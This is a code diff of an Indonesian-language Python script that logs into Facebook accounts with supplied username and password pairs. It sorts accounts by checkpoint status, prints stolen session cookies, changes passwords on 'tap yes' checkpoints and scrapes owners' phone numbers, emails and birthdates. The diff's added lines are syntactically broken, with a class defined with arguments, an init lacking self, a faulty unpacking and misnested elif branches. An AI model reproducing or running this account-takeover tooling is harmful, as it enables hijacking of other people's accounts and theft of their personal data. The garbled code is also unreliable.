@@ -513,31 +513,16 @@ def userset():
     else:print(f"{P}[•] Pilihan salah ");exit()
 
 #####LOGIN HASIL
-def log_hasil(user, pasw):
-    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
-    ses = requests.Session()
-    ses.headers.update({
-    "Host": "mbasic.facebook.com",
-    "cache-control": "max-age=0",
-    "upgrade-insecure-requests": "1",
-    "origin": host,
-    "content-type": "application/x-www-form-urlencoded",
-    "user-agent": ua,
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "x-requested-with": "mark.via.gp",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-user": "?1",
-    "sec-fetch-dest": "document",
-    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
-    "accept-encoding": "gzip, deflate",
-    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-    })
-    data = {}
-    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
-    fm = ged.find("form",{"method":"post"})
-    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
-    for i in fm.find_all("input"):
+class log_hasil(user, pasw):
+  def __init__():
+      ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+      ses = requests.Session()
+      ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": host,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": host+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+      data = {}
+      ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+      fm = ged.find("form",{"method":"post"})
+      list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+      for i in fm.find_all("input"):
         if i.get("name") in list:
             data.update({i.get("name"):i.get("value")})
         else:
@@ -574,115 +559,107 @@ def log_hasil(user, pasw):
         print(f"{P}[•]{M}>>>> {oh}")
     else:
         print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
-        
-def cek_opsi(user, pasw):
-		global aman,cpsalah
-		session=req.Session()
-		session.headers.update({
-			"Host":"mbasic.facebook.com",
-			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-			"accept-encoding":"gzip, deflate",
-			"accept-language":"id-ID,id;q=0.9",
-			"referer":"https://mbasic.facebook.com/",
-			"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
-		})
-		soup=par(session.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
-		link=soup.find("form",{"method":"post"})
-		for x in soup("input"):
-			data.update({x.get("name"):x.get("value")})
-		data.update({"email":user,"pass":pasw})
-		urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
-		response=par(urlPost.text, "html.parser")
-		if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
-			print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-		if "c_user" in session.cookies.get_dict():
-			if "Akun Anda Dikunci" in urlPost.text:
-				if satua==True:
-					print(f"\r\33[1;33m[CP] {user} | {pasw}								\33[37;1m\n",end="")
-				print(f"\r[×] Akun sesi new					\n\n",end="")
-			else:
-				aman+=1
-				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				if satua==True:
-					print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
-				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
-				self.get_info(session,coki)
-				self.cek_apk(session,coki)
-		elif "checkpoint" in session.cookies.get_dict():
-			cp+=1
-			title=re.findall("\<title>(.*?)<\/title>",str(response))
-			link2=response.find("form",{"method":"post"})
-			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
-			for x in response("input"):
-				if x.get("name") in listInput:
-					data2.update({x.get("name"):x.get("value")})
-			an=session.post(url+link2.get("action"),data=data2)
-			response2=par(an.text,"html.parser")
-			number=0
-			cek=[cek for cek in response2.find_all("option")]
-			if satua==True:
-				print(f"\r\33[1;33m[CP] {user} | {pasw}								\33[37;1m\n",end="")
-			print(f"\r[{BM}!{P}] Terdapat {BM}{len(cek)}{P} opsi:\n",end="")
-			if(len(cek)==0):
-				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-					if "y" in ubahP:
-						ubah_pw(session,response,link2)
-					else:
-						print(f"\r[{H}√{P}] {H}Akun tap yes{P}\n[=] Cookie: {BM}{coki}{P}\n")
-						cek_apk(session,coki)
-				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-					print(f"\r[{M}×{P}] {M}Akun a2f on            {P}\n")
-				else:
-					print(f"{M}[!]Kesalahan!{P}")
-			elif(len(cek)<=1):
-				for x in range(len(cek)):
-					number+=1
-					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
-					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
-				print("")
-			elif(len(cek)>=2):
-				for x in range(len(cek)):
-					number+=1
-					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
-					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
-				print("")
-			else:
-				if "c_user" in session.cookies.get_dict():
-					cp-=1
-					aman+=1
-					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-					if satua==True:
-						print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
-					get_info(session,coki)
-					cek_apk(session,coki)
-		else:
-			salah+=1
-			print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
-	def ubah_pw(session,response,link2):
-		dat,dat2={},{}
-		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
-		for x in response("input"):
-			if x.get("name") in but:
-				dat.update({x.get("name"):x.get("value")})
-		ubahPw=session.post(url+link2.get("action"),data=dat).text
-		resUbah=par(ubahPw,"html.parser")
-		link3=resUbah.find("form",{"method":"post"})
-		but2=["submit[Next]","nh","fb_dtsg","jazoest"]
-		if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-			for b in resUbah("input"):
-				if b.get("name") in but2:
-					dat2.update({b.get("name"):b.get("value")})
-			dat2.update({"password_new":"".join(pwBaru)})
-			an=session.post(url+link3.get("action"),data=dat2)
-			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
-			if "checkpoint" not in coki:
-				get_info(session,coki)
-				cek_apk(session,coki)
-			else:
-				print("")
-def get_info(session,coki):
+   def cek_opsi(user, pasw):
+     global aman,cpsalah
+     session=req.Session()
+     session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
+     soup=par(session.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+     ink=soup.find("form",{"method":"post"})
+     for x in soup("input"):
+       data.update({x.get("name"):x.get("value")})
+       data.update({"email":user,"pass":pasw})
+       urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+       response=par(urlPost.text, "html.parser")
+     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
+       print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
+     if "c_user" in session.cookies.get_dict():
+       if "Akun Anda Dikunci" in urlPost.text:
+         if satua==True:
+           print(f"\r\33[1;33m[CP] {user} | {pasw}								\33[37;1m\n",end="")
+           print(f"\r[×] Akun sesi new					\n\n",end="")
+         else:
+           aman+=1
+           coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+           if satua==True:
+             print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
+             print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
+             get_info(session,coki)
+             cek_apk(session,coki)
+           elif "checkpoint" in session.cookies.get_dict():
+             cp+=1
+             title=re.findall("\<title>(.*?)<\/title>",str(response))
+             link2=response.find("form",{"method":"post"})
+             listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+             for x in response("input"):
+               if x.get("name") in listInput:
+                 data2.update({x.get("name"):x.get("value")})
+                 an=session.post(url+link2.get("action"),data=data2)
+                 response2=par(an.text,"html.parser")
+                 number=0
+                 cek=[cek for cek in response2.find_all("option")]
+               if satua==True:
+                 print(f"\r\33[1;33m[CP] {user} | {pasw}								\33[37;1m\n",end="")
+                 print(f"\r[{BM}!{P}] Terdapat {BM}{len(cek)}{P} opsi:\n",end="")
+               if(len(cek)==0):
+                 if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+                   coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                 if "y" in ubahP:
+                   ubah_pw(session,response,link2)
+                 else:
+                   print(f"\r[{H}√{P}] {H}Akun tap yes{P}\n[=] Cookie: {BM}{coki}{P}\n")
+                   cek_apk(session,coki)
+                 elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
+                   print(f"\r[{M}×{P}] {M}Akun a2f on            {P}\n")
+                 else:
+                   print(f"{M}[!]Kesalahan!{P}")
+                 elif(len(cek)<=1):
+                   for x in range(len(cek)):
+                     number+=1
+                     opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
+                     print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
+                     print("")
+                   elif(len(cek)>=2):
+                     for x in range(len(cek)):
+                       number+=1
+                       opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
+                       print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
+                       print("")
+                     else:
+                       if "c_user" in session.cookies.get_dict():
+                         cp-=1
+                         aman+=1
+                         coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                     if satua==True:
+                       print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
+                       get_info(session,coki)
+                       cek_apk(session,coki)
+                     else:
+                       salah+=1
+                       print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
+  def ubah_pw(session,response,link2):
+    data,dat,dat2={},{}
+    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+    for x in response("input"):
+      if x.get("name") in but:
+        dat.update({x.get("name"):x.get("value")})
+        ubahPw=session.post(url+link2.get("action"),data=dat).text
+        resUbah=par(ubahPw,"html.parser")
+        link3=resUbah.find("form",{"method":"post"})
+        but2=["submit[Next]","nh","fb_dtsg","jazoest"]
+      if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
+      for b in resUbah("input"):
+        if b.get("name") in but2:
+          dat2.update({b.get("name"):b.get("value")})
+          dat2.update({"password_new":"".join(pwBaru)})
+          an=session.post(url+link3.get("action"),data=dat2)
+          coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+          print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
+        if "checkpoint" not in coki:
+          get_info(session,coki)
+          cek_apk(session,coki)
+        else:
+          print("")
+  def get_info(session,coki):
 		get_id = session.get("https://mbasic.facebook.com/profile.php",cookie={"cookies":coki}).text
 		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
 		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookie={"cookies":coki}).text
@@ -709,7 +686,7 @@ def get_info(session,coki):
 		except:
 			teman = ""
 		print(f"[{H}={P}] Nama: {K}{nama}{P}\n[{H}={P}] Tahun pembuatan: {K}{tahun}{P}\n[{H}={P}] Teman: {K}({teman}){P}\n[{H}={P}] Nomer-ponsel: {K}{nomer}{P}\n[{H}={P}] Email: {K}{email}{P}\n[{H}={P}] Tanggal-lahir: {K}{ttl}{P}")
-def cek_apk(host,session,coki):
+  def cek_apk(host,session,coki):
 		hit1, hit2 = 0,0
 		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie={"cookies":coki}).text
 		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie={"cookies":coki}).text
